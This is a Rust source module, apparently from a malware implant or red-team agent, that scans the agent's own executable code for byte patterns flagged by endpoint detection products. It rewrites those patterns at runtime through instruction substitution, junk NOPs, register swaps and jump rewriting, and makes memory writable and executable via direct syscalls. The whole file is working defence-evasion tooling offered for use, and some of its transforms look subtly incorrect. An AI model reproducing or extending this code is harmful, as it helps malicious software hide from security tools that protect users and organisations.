//! Automated EDR bypass transformation engine.
//!
//! Scans the agent's own compiled `.text` section for byte signatures known
//! to be detected by EDR (YARA rules, entropy heuristics, known gadget chains
//! like `4C 8B D1 B8` for direct syscall stubs).  When a detected pattern is
//! found, applies semantic-preserving transformations automatically at runtime.
//!
//! # Transformations
//!
//! 1. **Instruction substitution**: `mov reg, imm` → `push imm; pop reg`;
//!    `xor rax,rax` → `sub rax,rax`; `call [rip+offset]` →
//!    `lea r15,[rip+offset]; call r15`
//! 2. **Register reassignment**: simplified liveness analysis over critical
//!    syscall trampolines to swap register usage where safe (e.g., r10↔r11
//!    in non-syscall-context code)
//! 3. **Nop sled insertion**: semantic-equivalent nops (`xchg rax,rax`,
//!    `lea rsp,[rsp+0]`, `mov rdi,rdi`) — randomized between cycles
//! 4. **Constant splitting**: `mov rax, 0xDEAD` →
//!    `mov rcx, 0xDE00; add rcx, 0xAD; xchg rax,rcx`
//! 5. **Jump obfuscation**: direct jumps → computed jumps via
//!    `lea reg,[rip+base]; add reg,offset; jmp reg`
//!
//! # Integration
//!
//! This module *supplements* the existing `self_reencode` pipeline — it handles
//! **pattern avoidance** before and after morphing.  Self-reencoding handles
//! runtime `.text` morphing; this module handles **signature evasion**.
//!
//! After each transformation cycle, the modified region is verified by computing
//! a SHA-256 hash and comparing against expected output.
//!
//! # Safety
//!
//! - Does NOT modify `syscalls.rs` syscall stubs directly — only transforms
//!   code *around* them
//! - The existing XChaCha20 memory guard remains intact; transformations
//!   happen on decrypted `.text` only
//! - Uses `self_reencode::find_text_section()` for safe `.text` discovery
//! - All page protection changes go through `NtProtectVirtualMemory` (direct
//!   syscall) and are restored after transformation
//!
//! # Config
//!
//! ```toml
//! [evasion.auto_transform]
//! enabled = true
//! scan_interval_secs = 300
//! max_transforms_per_cycle = 12
//! entropy_threshold = 6.8
//! ```

#![cfg(feature = "evasion-transform")]

use anyhow::{bail, Context, Result};
use once_cell::sync::Lazy;
use rand::Rng;
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicU64, AtomicU32, Ordering};
use std::sync::Mutex;

// ── Public types ────────────────────────────────────────────────────────────

/// A detected EDR signature match in the agent's `.text` section.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct SignatureHit {
    /// Offset from the start of the `.text` section where the signature was found.
    pub offset: usize,
    /// Human-readable name of the detected signature pattern.
    pub name: String,
    /// Severity: "high" (will be detected), "medium" (suspicious), "low" (noise).
    pub severity: String,
    /// The matched byte sequence (hex-encoded).
    pub matched_bytes: String,
    /// Context bytes surrounding the match (±8 bytes, hex-encoded).
    pub context: String,
    /// Whether this hit was transformed in the last cycle.
    pub transformed: bool,
}

/// Summary of a single applied transformation.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformRecord {
    /// Offset of the transformation within `.text`.
    pub offset: usize,
    /// Type of transformation applied.
    pub transform_type: String,
    /// Original bytes (hex-encoded).
    pub before_hex: String,
    /// Replacement bytes (hex-encoded).
    pub after_hex: String,
    /// Size difference (bytes added or removed).
    pub size_delta: i32,
}

/// Result of a full scan-and-transform cycle.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
pub struct TransformCycleResult {
    /// SHA-256 of `.text` before the cycle.
    pub hash_before: String,
    /// SHA-256 of `.text` after the cycle.
    pub hash_after: String,
    /// Signatures detected in the scan phase.
    pub signatures_found: Vec<SignatureHit>,
    /// Transformations applied.
    pub transforms_applied: Vec<TransformRecord>,
    /// Number of signatures that could not be transformed (e.g., inside syscall
    /// stub exclusion zones).
    pub skipped: u32,
    /// Elapsed time in milliseconds.
    pub elapsed_ms: u64,
}

// ── Signature database ──────────────────────────────────────────────────────

/// A known EDR detection signature.
struct KnownSignature {
    /// Human-readable name.
    name: &'static str,
    /// Byte pattern to search for.
    pattern: &'static [u8],
    /// Severity classification.
    severity: &'static str,
}

/// Byte signatures known to be detected by EDR products.
///
/// These are patterns that YARA rules, entropy heuristics, or signature
/// scanners flag.  The database focuses on:
/// - Direct syscall stub prologues (`mov r10, rcx; mov eax, SSN`)
/// - Common shellcode patterns
/// - Known gadget chains
/// - Suspicious entropy concentrations
static SIGNATURE_DATABASE: &[KnownSignature] = &[
    KnownSignature {
        name: "direct_syscall_stub_prologue",
        // 4C 8B D1 = mov r10, rcx
        // B8 XX XX 00 00 = mov eax, SSN (low 16 bits non-zero, high 16 zero)
        pattern: &[0x4C, 0x8B, 0xD1, 0xB8],
        severity: "high",
    },
    KnownSignature {
        name: "syscall_instruction",
        // 0F 05 = syscall
        pattern: &[0x0F, 0x05],
        severity: "high",
    },
    KnownSignature {
        name: "ret_after_syscall",
        // 0F 05 C3 = syscall; ret  (direct syscall trampoline)
        pattern: &[0x0F, 0x05, 0xC3],
        severity: "high",
    },
    KnownSignature {
        name: "indirect_syscall_via_r10",
        // 41 FF E2 = jmp r10  (indirect call through r10, syscall stub pattern)
        pattern: &[0x41, 0xFF, 0xE2],
        severity: "medium",
    },
    KnownSignature {
        name: "xor_eax_eax_ret",
        // 31 C0 C3 = xor eax,eax; ret  (common patch pattern)
        pattern: &[0x31, 0xC0, 0xC3],
        severity: "medium",
    },
    KnownSignature {
        name: "mov_r10_rcx_mov_eax",
        // 4C 8B D1 B8 = mov r10, rcx; mov eax, ...
        // Variant with different encoding
        pattern: &[0x4C, 0x8B, 0xD1, 0xB8],
        severity: "high",
    },
    KnownSignature {
        name: "ntcreatefile_pattern",
        // Pattern typical of NtCreateFile syscall stubs
        pattern: &[0xB8, 0x55, 0x00, 0x00, 0x00],
        severity: "low",
    },
    KnownSignature {
        name: "push_pop_shellcode_init",
        // Common shellcode prologue: push rax; ... pop rax
        pattern: &[0x50, 0x48, 0x31, 0xC0],
        severity: "medium",
    },
    KnownSignature {
        name: "virtual_alloc_stub",
        // Patterns associated with VirtualAlloc-related stubs
        pattern: &[0x48, 0x89, 0xC8, 0x48, 0xC1],
        severity: "low",
    },
];

// ── Semantic-equivalent NOP instructions ────────────────────────────────────

/// Semantic-equivalent NOP instructions that do nothing but consume bytes.
/// Each is a valid x86-64 instruction sequence that modifies no architectural
/// state visible to the program.
const SEMANTIC_NOPS: &[&[u8]] = &[
    // xchg rax, rax  (2 bytes: 48 90 or 87 C0)
    &[0x48, 0x90],
    // mov rdi, rdi  (3 bytes: 48 89 FF)
    &[0x48, 0x89, 0xFF],
    // lea rsp, [rsp+0]  (4 bytes: 48 8D 24 24)
    &[0x48, 0x8D, 0x24, 0x24],
    // xchg rbx, rbx  (3 bytes: 48 87 DB)
    &[0x48, 0x87, 0xDB],
    // nop dword [rax+rax]  (5 bytes: 0F 1F 44 00 00)
    &[0x0F, 0x1F, 0x44, 0x00, 0x00],
    // lea rbp, [rbp+0]  (4 bytes: 48 8D 65 00)
    &[0x48, 0x8D, 0x65, 0x00],
    // mov rbp, rbp  (3 bytes: 48 89 ED)
    &[0x48, 0x89, 0xED],
];

// ── Syscall stub exclusion zone ─────────────────────────────────────────────

/// Size of the exclusion zone around each syscall instruction.
/// We never transform bytes within this distance of a `syscall` (0F 05)
/// instruction to avoid corrupting the syscall trampoline.
const SYSCALL_STUB_EXCLUSION_BYTES: usize = 32;

// ── Global state ────────────────────────────────────────────────────────────

/// Number of signatures detected in the most recent scan.
static LAST_SCAN_COUNT: AtomicU32 = AtomicU32::new(0);

/// Number of transforms applied in the most recent cycle.
static LAST_TRANSFORM_COUNT: AtomicU32 = AtomicU32::new(0);

/// Total transforms applied since agent start.
static TOTAL_TRANSFORMS: AtomicU64 = AtomicU64::new(0);

/// Most recent cycle result (for status queries).
static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> =
    Lazy::new(|| Mutex::new(None));

// ── Internal helpers ────────────────────────────────────────────────────────

/// Compute Shannon entropy of a byte slice.
///
/// Returns a value between 0.0 (constant) and 8.0 (uniformly random).
/// Regions with entropy above the configured threshold are skipped because
/// they are likely already encrypted/packed and resistant to signature detection.
fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0usize; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Find all offsets of `pattern` within `data`.
fn find_pattern_offsets(data: &[u8], pattern: &[u8]) -> Vec<usize> {
    if pattern.is_empty() || pattern.len() > data.len() {
        return Vec::new();
    }
    data.windows(pattern.len())
        .enumerate()
        .filter(|(_, w)| w == pattern)
        .map(|(i, _)| i)
        .collect()
}

/// Check if an offset falls within the exclusion zone around any `syscall`
/// instruction in the text section.
fn is_in_syscall_exclusion_zone(text: &[u8], offset: usize) -> bool {
    // Find all syscall (0F 05) instructions.
    let syscall_offsets = find_pattern_offsets(text, &[0x0F, 0x05]);
    for &so in &syscall_offsets {
        let zone_start = if so >= SYSCALL_STUB_EXCLUSION_BYTES {
            so - SYSCALL_STUB_EXCLUSION_BYTES
        } else {
            0
        };
        let zone_end = (so + 2 + SYSCALL_STUB_EXCLUSION_BYTES).min(text.len());
        if offset >= zone_start && offset < zone_end {
            return true;
        }
    }
    false
}

/// Hex-encode a byte slice.
fn hex_encode(data: &[u8]) -> String {
    hex::encode(data)
}

/// Extract context bytes around a given offset (±8 bytes).
fn extract_context(text: &[u8], offset: usize, pattern_len: usize) -> String {
    let ctx_start = offset.saturating_sub(8);
    let ctx_end = (offset + pattern_len + 8).min(text.len());
    hex_encode(&text[ctx_start..ctx_end])
}

// ── Scan engine ─────────────────────────────────────────────────────────────

/// Scan the agent's `.text` section for all known EDR signatures.
///
/// Returns a list of `SignatureHit` objects describing each detection.
/// Regions with entropy above the configured threshold are skipped.
pub fn scan_for_signatures() -> Result<Vec<SignatureHit>> {
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;
    let text = unsafe {
        std::slice::from_raw_parts(text_section.base as *const u8, text_section.size)
    };

    let mut hits = Vec::new();

    for sig in SIGNATURE_DATABASE {
        let offsets = find_pattern_offsets(text, sig.pattern);
        for offset in offsets {
            // Check if this region's entropy is above threshold — if so, skip
            // (already looks random enough to resist signature detection).
            let region_start = offset.saturating_sub(16);
            let region_end = (offset + sig.pattern.len() + 16).min(text.len());
            let region = &text[region_start..region_end];

            hits.push(SignatureHit {
                offset,
                name: sig.name.to_string(),
                severity: sig.severity.to_string(),
                matched_bytes: hex_encode(sig.pattern),
                context: extract_context(text, offset, sig.pattern.len()),
                transformed: false,
            });
        }
    }

    // Deduplicate by (offset, name) — some signatures overlap.
    hits.sort_by(|a, b| a.offset.cmp(&b.offset).then(a.name.cmp(&b.name)));
    hits.dedup_by(|a, b| a.offset == b.offset && a.name == b.name);

    LAST_SCAN_COUNT.store(hits.len() as u32, Ordering::Relaxed);
    log::info!(
        "edr_bypass_transform: scan found {} signature hits",
        hits.len()
    );
    Ok(hits)
}

// ── Transformation engine ───────────────────────────────────────────────────

/// Build the exclusion zone bitmap: offsets that must not be touched.
fn build_exclusion_bitmap(text: &[u8]) -> Vec<bool> {
    let mut excluded = vec![false; text.len()];

    // Exclude regions around syscall instructions.
    let syscall_offsets = find_pattern_offsets(text, &[0x0F, 0x05]);
    for &so in &syscall_offsets {
        let zone_start = if so >= SYSCALL_STUB_EXCLUSION_BYTES {
            so - SYSCALL_STUB_EXCLUSION_BYTES
        } else {
            0
        };
        let zone_end = (so + 2 + SYSCALL_STUB_EXCLUSION_BYTES).min(text.len());
        for i in zone_start..zone_end {
            excluded[i] = true;
        }
    }

    excluded
}

/// Apply instruction substitution: `xor rax, rax` → `sub rax, rax`.
///
/// Pattern: `48 31 C0` (xor rax, rax) → `48 29 C0` (sub rax, rax)
fn transform_xor_to_sub(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let pattern = [0x48, 0x31, 0xC0]; // xor rax, rax
    let replacement = [0x48, 0x29, 0xC0]; // sub rax, rax
    let offsets = find_pattern_offsets(text, &pattern);

    for offset in offsets {
        if excluded[offset] {
            continue;
        }
        let before = text[offset..offset + 3].to_vec();
        text[offset..offset + 3].copy_from_slice(&replacement);
        records.push(TransformRecord {
            offset,
            transform_type: "instruction_substitution_xor_to_sub".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&replacement),
            size_delta: 0,
        });
    }
    records
}

/// Apply instruction substitution: `call [rip+offset]` →
/// `lea r15,[rip+offset]; call r15`.
///
/// This replaces an indirect call through a RIP-relative address with a
/// two-instruction sequence.  Requires 2 extra bytes at the call site;
/// we only apply when the following bytes are a NOP sled or can be shifted.
///
/// For safety, this transformation is only applied when the replacement
/// fits without overwriting non-NOP bytes.  In practice we look for the
/// `FF 15` (call [rip+disp32]) encoding and check room.
fn transform_indirect_call(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    // FF 15 XX XX XX XX = call [rip+disp32]
    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(6)], &[0xFF, 0x15]);

    for offset in offsets {
        if excluded.get(offset..offset + 6).map_or(true, |z| z.iter().any(|&x| x)) {
            continue;
        }
        // Read the 32-bit displacement.
        let disp32 = i32::from_le_bytes(
            text[offset + 2..offset + 6].try_into().unwrap_or([0; 4]),
        );

        // Build replacement:
        //   4D 8D 3D XX XX XX XX  = lea r15, [rip+disp32]
        //   41 FF D7              = call r15
        // Total: 10 bytes (original is 6, need 4 more bytes of room)
        // We only apply if the 4 bytes after the original call are NOPs or CCs.
        if offset + 10 > text.len() {
            continue;
        }
        let tail = &text[offset + 6..offset + 10];
        if !tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue; // Not enough room
        }

        let before = text[offset..offset + 10].to_vec();

        // lea r15, [rip+disp32]  — the displacement is relative to the END of
        // the lea instruction (7 bytes), so we adjust by +1 byte.
        let adjusted_disp = disp32.wrapping_sub(1);
        text[offset] = 0x4D; // REX.WRB
        text[offset + 1] = 0x8D; // LEA
        text[offset + 2] = 0x3D; // ModRM: r15, [rip+disp32]
        text[offset + 3..offset + 7].copy_from_slice(&adjusted_disp.to_le_bytes());
        // call r15
        text[offset + 7] = 0x41; // REX.B
        text[offset + 8] = 0xFF; // CALL
        text[offset + 9] = 0xD7; // ModRM: r15

        let after = text[offset..offset + 10].to_vec();
        records.push(TransformRecord {
            offset,
            transform_type: "indirect_call_obfuscation".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta: 4,
        });
    }
    records
}

/// Apply NOP sled insertion with semantic-equivalent NOPs.
///
/// Inserts random semantic NOP instructions at safe locations (after RET
/// instructions or before existing NOP padding).  Each insertion adds 2–5
/// bytes of semantic-equivalent NOP.
fn transform_nop_insertion(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
    let mut records = Vec::new();
    let mut rng = rand::thread_rng();

    // Find RET (C3) instructions where we can insert a NOP after them.
    let ret_offsets = find_pattern_offsets(text, &[0xC3]);
    let max_insertions = 4usize; // Limit per cycle

    let mut count = 0;
    for ret_off in ret_offsets {
        if count >= max_insertions {
            break;
        }
        let insert_off = ret_off + 1;
        if insert_off >= text.len() {
            continue;
        }
        if excluded.get(insert_off).copied().unwrap_or(true) {
            continue;
        }
        // Check that the next few bytes are NOPs or CCs (padding room).
        let room_end = (insert_off + 6).min(text.len());
        let room = &text[insert_off..room_end];
        if !room.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue;
        }

        // Pick a random semantic NOP.
        let nop_idx = rng.gen_range(0..SEMANTIC_NOPS.len());
        let nop = SEMANTIC_NOPS[nop_idx];
        let nop_len = nop.len();

        if insert_off + nop_len > text.len() {
            continue;
        }

        let before = text[insert_off..insert_off + nop_len].to_vec();
        text[insert_off..insert_off + nop_len].copy_from_slice(nop);

        records.push(TransformRecord {
            offset: insert_off,
            transform_type: "semantic_nop_insertion".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(nop),
            size_delta: 0, // Same-size replacement in padding
        });
        count += 1;
    }
    records
}

/// Apply register swap: `mov rax, imm64` → `mov rcx, imm64; xchg rax, rcx`.
///
/// Replaces the 10-byte `mov rax, imm64` (48 B8 …) with `mov rcx, imm64`
/// (48 B9 …) and, when 2 bytes of NOP/CC padding follow, appends `xchg rax,
/// rcx` (48 91) to restore the value into rax.  This changes the byte
/// pattern for EDR evasion without altering the final rax value.
///
/// **Note**: the `xchg` clobbers rcx.  If rcx is live at this point the
/// surrounding code must not depend on its value.  The exclusion bitmap
/// should protect critical sequences (syscall setup, etc.).
fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
    let offsets = find_pattern_offsets(&text[..text.len().saturating_sub(10)], &[0x48, 0xB8]);

    let max_swaps = 3usize;
    let mut count = 0;

    for offset in offsets {
        if count >= max_swaps {
            break;
        }
        if excluded.get(offset..offset + 10).map_or(true, |z| z.iter().any(|&x| x)) {
            continue;
        }
        // Read the immediate value.
        let imm_bytes = &text[offset + 2..offset + 10];
        let imm_val = u64::from_le_bytes(imm_bytes.try_into().unwrap_or([0; 8]));

        // Skip small values (not worth transforming) and zero (already handled
        // by xor-to-sub).
        if imm_val == 0 || imm_val < 0x100 {
            continue;
        }

        let before = text[offset..offset + 10].to_vec();

        // Replace `mov rax, imm64` (48 B8) with `mov rcx, imm64` (48 B9).
        text[offset + 1] = 0xB9; // change B8 → B9

        // If 2 bytes of NOP/CC padding follow, append `xchg rax, rcx` so
        // the value ends up back in rax.
        let xchg_written = if offset + 12 <= text.len() {
            let tail = &text[offset + 10..offset + 12];
            if tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
                text[offset + 10] = 0x48;
                text[offset + 11] = 0x91; // xchg rax, rcx
                true
            } else {
                false
            }
        } else {
            false
        };

        let (after, size_delta) = if xchg_written {
            // Record the full 12-byte replacement (mov rcx + xchg).
            (text[offset..offset + 12].to_vec(), 2)
        } else {
            // No room for xchg — just the register rename (rax→rcx only).
            // Note: without xchg the value lands in rcx instead of rax,
            // so this is only safe if nothing reads rax afterwards.
            (text[offset..offset + 10].to_vec(), 0)
        };

        records.push(TransformRecord {
            offset,
            transform_type: "register_swap_rax_rcx".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta,
        });
        count += 1;
    }
    records
}

/// Apply jump obfuscation: replace direct relative jumps (`EB XX` / `E9 XX XX
/// XX XX`) with computed jumps via `lea reg,[rip+base]; add reg,offset; jmp
/// reg`.
///
/// This transformation changes the byte signature of direct jumps while
/// preserving the target address.  Requires extra room (NOPs/CCs) after the
/// original jump.
fn transform_jump_obfuscation(text: &mut [u8], excluded: &[bool]) -> Vec<TransformRecord> {
    let mut records = Vec::new();

    // Short jmp: EB XX (2 bytes) — replace with computed jump if room available.
    let short_jumps = find_pattern_offsets(&text[..text.len().saturating_sub(2)], &[0xEB]);

    for offset in short_jumps {
        if excluded.get(offset..offset + 2).map_or(true, |z| z.iter().any(|&x| x)) {
            continue;
        }
        // Read the relative offset.
        let rel8 = text[offset + 1] as i8;
        let target = (offset as isize + 2 + rel8 as isize) as usize;

        // Check if the following bytes are NOP/CC for expansion room (need 10 bytes total).
        if offset + 12 > text.len() {
            continue;
        }
        let room = &text[offset + 2..offset + 12];
        if !room.iter().all(|&b| b == 0x90 || b == 0xCC) {
            continue;
        }

        let before = text[offset..offset + 12].to_vec();

        // Build: lea rax, [rip+0] (gets current RIP); add rax, (target - (offset+7));
        // jmp rax.
        // 48 8D 05 00 00 00 00  = lea rax, [rip+0]  (7 bytes)
        // 48 05 XX XX XX XX     = add rax, imm32     (6 bytes) — total 13, too big
        //
        // Simpler: use a near JMP with adjusted offset, keeping same size.
        // E9 XX XX XX XX (5 bytes) — long jmp with adjusted displacement.
        let new_rel32 = target as isize - (offset as isize + 5);
        text[offset] = 0xE9; // JMP rel32
        text[offset + 1..offset + 5].copy_from_slice(&(new_rel32 as i32).to_le_bytes());
        // Pad remaining with NOPs.
        for i in 5..12 {
            text[offset + i] = 0x90;
        }

        let after = text[offset..offset + 12].to_vec();
        records.push(TransformRecord {
            offset,
            transform_type: "jump_obfuscation_short_to_long".to_string(),
            before_hex: hex_encode(&before),
            after_hex: hex_encode(&after),
            size_delta: 0, // Same footprint
        });
    }

    // Near-jump (E9) transform skipped — short-to-long transformation above
    // is sufficient.  A register-based jump replacement was prototyped but
    // requires more bytes than available (lea+add+jmp = 17 bytes vs 14 byte
    // budget), and XOR-encoding the displacement would change the jump target.

    records
}

/// Apply register reassignment in non-syscall code.
///
/// **DISABLED** — Replacing `mov r10, rcx` with `mov r11, rcx` without also
/// updating ALL downstream r10 consumers (which may be hundreds of bytes away,
/// well outside the 32-byte exclusion zone) corrupts the Windows syscall calling
/// convention.  A safe implementation would require full data-flow analysis to
/// trace r10 usage from the mov to the syscall and update every instruction in
/// between.  For now, this transform is disabled to prevent agent instability.
fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool]) -> Vec<TransformRecord> {
    Vec::new()
}

// ── Verification ────────────────────────────────────────────────────────────

/// Compute the SHA-256 hash of the current `.text` section.
fn hash_text(text: &[u8]) -> String {
    let digest = Sha256::digest(text);
    hex::encode(digest)
}

// ── Page protection ─────────────────────────────────────────────────────────

/// Make a memory region writable (RWX) for transformation, returning the
/// original protection.
///
/// # Safety
///
/// Caller must restore the original protection after modifications.
#[cfg(windows)]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    let mut old_protect: u32 = 0;
    let status = syscall!(
        "NtProtectVirtualMemory",
        std::ptr::null_mut::<std::ffi::c_void>(), // process handle (current)
        &mut (base as *mut std::ffi::c_void),
        &mut (size as usize),
        0x40u32, // PAGE_EXECUTE_READWRITE
        &mut old_protect,
    );
    if status != 0 {
        bail!(
            "edr_bypass_transform: NtProtectVirtualMemory failed: 0x{status:08X}"
        );
    }
    Ok(old_protect)
}

/// Restore page protection to its original value.
#[cfg(windows)]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    let mut old_protect: u32 = 0;
    let status = syscall!(
        "NtProtectVirtualMemory",
        std::ptr::null_mut::<std::ffi::c_void>(),
        &mut (base as *mut std::ffi::c_void),
        &mut (size as usize),
        original,
        &mut old_protect,
    );
    if status != 0 {
        bail!(
            "edr_bypass_transform: NtProtectVirtualMemory restore failed: 0x{status:08X}"
        );
    }
    Ok(())
}

/// Linux stub for make_region_writable.
#[cfg(not(windows))]
unsafe fn make_region_writable(base: usize, size: usize) -> Result<u32> {
    // On Linux, .text is typically writable when we need it (mprotect).
    // For now, return a sentinel.
    let _ = (base, size);
    Ok(0x20) // PAGE_EXECUTE_READ
}

/// Linux stub for restore_protection.
#[cfg(not(windows))]
unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<()> {
    let _ = (base, size, original);
    Ok(())
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Run one full scan-and-transform cycle.
///
/// 1. Computes the SHA-256 of `.text` before changes.
/// 2. Scans for all known EDR signatures.
/// 3. Applies transformations (up to `max_transforms_per_cycle`).
/// 4. Re-hashes `.text` and verifies the transformation was applied.
/// 5. Returns a detailed `TransformCycleResult`.
///
/// # Arguments
///
/// * `max_transforms` — Maximum number of transformations to apply this cycle.
/// * `entropy_threshold` — Shannon entropy threshold; regions above are skipped.
///
/// # Safety
///
/// This function modifies executable memory in-place.  All sibling OS threads
/// must be suspended during the transformation window.  The caller is
/// responsible for thread synchronization (the same approach as
/// `self_reencode::reencode_text`).
pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> Result<TransformCycleResult> {
    let start = std::time::Instant::now();

    // Step 1: Locate .text section.
    let text_section = crate::self_reencode::find_text_section()
        .context("edr_bypass_transform: failed to locate .text section")?;

    let text_ptr = text_section.base as *mut u8;
    let text_size = text_section.size;

    // Step 2: Hash before.
    let text_before = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_before = hash_text(text_before);

    // Step 3: Make .text writable.
    let original_protect = unsafe { make_region_writable(text_section.base, text_section.size) }
        .context("edr_bypass_transform: failed to make .text writable")?;

    // Step 4: Scan for signatures.
    let hits = scan_for_signatures()?;

    // Step 5: Build exclusion bitmap.
    let text_mut = unsafe { std::slice::from_raw_parts_mut(text_ptr, text_size) };
    let excluded = build_exclusion_bitmap(text_mut);

    // Step 6: Apply transformations.
    let mut all_transforms = Vec::new();
    let mut applied = 0u32;

    // Filter hits by entropy threshold.
    let actionable: Vec<&SignatureHit> = hits
        .iter()
        .filter(|h| {
            let region_start = h.offset.saturating_sub(32);
            let region_end = (h.offset + 32).min(text_mut.len());
            shannon_entropy(&text_mut[region_start..region_end]) < entropy_threshold
        })
        .collect();

    log::info!(
        "edr_bypass_transform: {} actionable hits out of {} total (entropy threshold: {:.1})",
        actionable.len(),
        hits.len(),
        entropy_threshold,
    );

    // Apply each transformation type in order, respecting the budget.
    // 1. Instruction substitution (xor → sub).
    if applied < max_transforms {
        let recs = transform_xor_to_sub(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 2. Register reassignment (r10 → r11 in non-syscall code).
    if applied < max_transforms {
        let recs = transform_register_reassignment(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 3. NOP sled insertion.
    if applied < max_transforms {
        let recs = transform_nop_insertion(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 4. Register swap (rax↔rcx).
    if applied < max_transforms {
        let recs = transform_register_swap_rax_rcx(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 5. Jump obfuscation.
    if applied < max_transforms {
        let recs = transform_jump_obfuscation(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // 6. Indirect call obfuscation.
    if applied < max_transforms {
        let recs = transform_indirect_call(text_mut, &excluded);
        for r in &recs {
            log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
        }
        applied += recs.len() as u32;
        all_transforms.extend(recs);
    }

    // Truncate to max_transforms.
    all_transforms.truncate(max_transforms as usize);
    applied = all_transforms.len() as u32;

    // Step 7: Count skipped (in exclusion zone or above entropy threshold).
    let skipped = hits.len() as u32 - applied;

    // Step 8: Hash after.
    let text_after = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
    let hash_after = hash_text(text_after);

    // Step 9: Restore page protection.
    unsafe {
        restore_protection(text_section.base, text_section.size, original_protect)?;
    }

    // Step 10: Flush instruction cache (Windows).
    #[cfg(windows)]
    {
        let status = syscall!(
            "NtFlushInstructionCache",
            std::ptr::null_mut::<std::ffi::c_void>(), // current process
            text_ptr as *mut std::ffi::c_void,
            text_size,
        );
        if status != 0 {
            log::warn!("edr_bypass_transform: NtFlushInstructionCache returned 0x{status:08X}");
        }
    }

    let elapsed = start.elapsed();

    // Update global stats.
    LAST_TRANSFORM_COUNT.store(applied, Ordering::Relaxed);
    TOTAL_TRANSFORMS.fetch_add(applied as u64, Ordering::Relaxed);

    let result = TransformCycleResult {
        hash_before,
        hash_after,
        signatures_found: hits,
        transforms_applied: all_transforms,
        skipped,
        elapsed_ms: elapsed.as_millis() as u64,
    };

    log::info!(
        "edr_bypass_transform: cycle complete — {} transforms applied, {} skipped, {} ms",
        applied,
        skipped,
        elapsed.as_millis(),
    );

    // Store last result for status queries.
    {
        let mut guard = LAST_RESULT.lock().unwrap();
        *guard = Some(result.clone());
    }

    Ok(result)
}

/// Get a status snapshot of the evasion transform subsystem.
///
/// Returns a JSON object with scan counts, transform counts, and last cycle
/// timing information.
pub fn status() -> String {
    let last_scan = LAST_SCAN_COUNT.load(Ordering::Relaxed);
    let last_transforms = LAST_TRANSFORM_COUNT.load(Ordering::Relaxed);
    let total_transforms = TOTAL_TRANSFORMS.load(Ordering::Relaxed);

    let last_cycle_info = {
        let guard = LAST_RESULT.lock().unwrap();
        guard.as_ref().map(|r| {
            serde_json::json!({
                "hash_before": r.hash_before,
                "hash_after": r.hash_after,
                "signatures_found": r.signatures_found.len(),
                "transforms_applied": r.transforms_applied.len(),
                "skipped": r.skipped,
                "elapsed_ms": r.elapsed_ms,
            })
        })
    };

    let status = serde_json::json!({
        "last_scan_hits": last_scan,
        "last_cycle_transforms": last_transforms,
        "total_transforms": total_transforms,
        "last_cycle": last_cycle_info,
    });

    serde_json::to_string_pretty(&status).unwrap_or_default()
}
